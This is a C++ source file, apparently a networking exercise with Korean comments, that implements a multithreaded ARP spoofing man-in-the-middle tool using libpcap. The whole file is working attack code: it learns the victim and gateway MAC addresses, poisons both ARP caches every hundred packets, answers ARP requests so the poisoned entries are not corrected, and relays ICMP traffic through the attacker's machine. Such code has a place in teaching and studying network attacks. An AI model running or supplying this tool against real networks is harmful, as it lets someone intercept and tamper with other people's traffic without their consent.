#include <cstdio>
#include <pcap.h>
#include "custom.h"
#include <iostream>
#include <thread>
#include <vector>

Param param  = {
	.dev_ = NULL
};

void work(Info *info){
	printf("%d %s %s %s\n", std::this_thread::get_id(), info->interface, info->sender, info->target);
	//Attacker Ip & Mac 가져오기
    info->attacker_ip = myIp(info->interface);
	info->attacker_mac = myMac(info->interface);
	printf("attacker_Ip : %s\n", ((std::string)info->attacker_ip).c_str());
	printf("attacker_Mac : %s\n", ((std::string)info->attacker_mac).c_str());

	char errbuf[PCAP_ERRBUF_SIZE];	
	
	pcap_t* handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
		exit(-1);
	}

	// Sender & Target Get IP
	info->sender_ip = Ip(info->sender);	 //victim_Mac
	info->target_ip = Ip(info->target); //gateway_Mac
	printf("sender_Ip : %s\n", ((std::string)info->sender_ip).c_str());
	printf("target_Ip : %s\n", ((std::string)info->target_ip).c_str());
	
	// Sender & Target Get Mac
	Mac boardcast_Mac = Mac::broadcastMac();
	
	// Sender Mac 확인
	sendArp(handle, info->attacker_ip, info->sender_ip, info->attacker_mac, boardcast_Mac, ArpHdr::Request);
	info->sender_mac = getMac(handle, info->sender_ip, info->attacker_ip, info->attacker_mac);	 			 // victim_Mac
	printf("sender_Mac : %s\n", ((std::string)info->sender_mac).c_str());

	// Sender Mac 확인	
	sendArp(handle, info->attacker_ip, info->target_ip, info->attacker_mac, boardcast_Mac, ArpHdr::Request);
	info->target_mac = getMac(handle, info->target_ip, info->attacker_ip, info->attacker_mac);	 			 // victim_Mac
	printf("target_Mac : %s\n", ((std::string)info->target_mac).c_str());
	
	struct pcap_pkthdr* header;
	const u_char* packet;
	int check = 0;
	int res = 0;
	while (true) {
		// Arp Spoofing Attack 
		if (check % 100 == 0 ){	// (지속적인 변조 시도)
			sendArp(handle, info->target_ip, info->sender_ip, info->attacker_mac, info->sender_mac, ArpHdr::Request); // sender table 변조
			sendArp(handle, info->sender_ip, info->target_ip, info->attacker_mac, info->target_mac, ArpHdr::Request); // target table 변조
			printf("Arp Spoofing Attack Success\n");
		}
		check++;
	
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		EthHdr* eth = (EthHdr*)(packet);
		
		if (eth->type() == EthHdr::Arp){ 	//ARP 변조 복구 방지 REPLY 구현
			ArpHdr* arp = (ArpHdr*)(packet+sizeof(EthHdr));

			if (arp->op() != ArpHdr::Request) continue;

			if (eth->dmac() == info->attacker_mac){
				printf("ARP 변조 복구 방지 REPLY\n");
				Ip sip = arp->tip();
				Ip dip = arp->sip();
				Mac smac = arp->tmac();
				Mac dmac = arp->smac();
				sendArp(handle, sip, dip, smac, dmac, ArpHdr::Reply);
			}
		}else if(eth->type() == EthHdr::Ip4){ 	//ICMP REPLY 구현
			IpHdr* ip = (IpHdr*)(packet+sizeof(EthHdr));
			IcmpHdr *icmp = (IcmpHdr*)(packet+sizeof(EthHdr)+ip->ihl()*4);

			if (ip->ptl() != IpHdr::ICMP) continue;
		
			//Icmp Request Relay (sender -> attacker, attacker -> target)
			if (eth->dmac() == info->attacker_mac && ip->sip() == info->sender_ip && icmp->type() == IcmpHdr::ECHO_REQUEST){
				printf("%d \t",std::this_thread::get_id());
				printf("Icmp Request Relay (sender -> attacker, attacker -> target)\n");
				eth->setDmac(info->target_mac);
				eth->setSmac(info->attacker_mac);

				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthHdr)+ip->tl());
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}else if (eth->dmac() == info->attacker_mac && ip->dip() == info->sender_ip && icmp->type() == IcmpHdr::ECHO_REPLAY){	//Icmp Request Relay (target -> attacker, attacker -> sender)
				printf("%d \t",std::this_thread::get_id());
				printf("Icmp REPLAY Relay (target -> attacker, attacker -> sender)\n");
				eth->setDmac(info->sender_mac);
				eth->setSmac(info->attacker_mac);

				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthHdr)+ip->tl());
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}
		}
	}
	pcap_close(handle);
}

int main(int argc, char* argv[]) {	
	if (!parse(&param, argc, argv))
		return -1;
	
	int count = (int)((argc -2) / 2);
	Info *info = (Info*)malloc(sizeof(Info)*count);

	for (int i = 0; i < count; i++){
		info[i].interface = argv[1];
		info[i].sender = argv[2*(i+1)];
		info[i].target = argv[2*(i+1)+1];
	}

	std::vector<std::thread> works;

	for (int i = 0; i < count; i++){
		works.push_back(std::thread(work, &info[i]));
	}

	for (int i = 0; i < count; i++){
		works[i].join();
	}
}
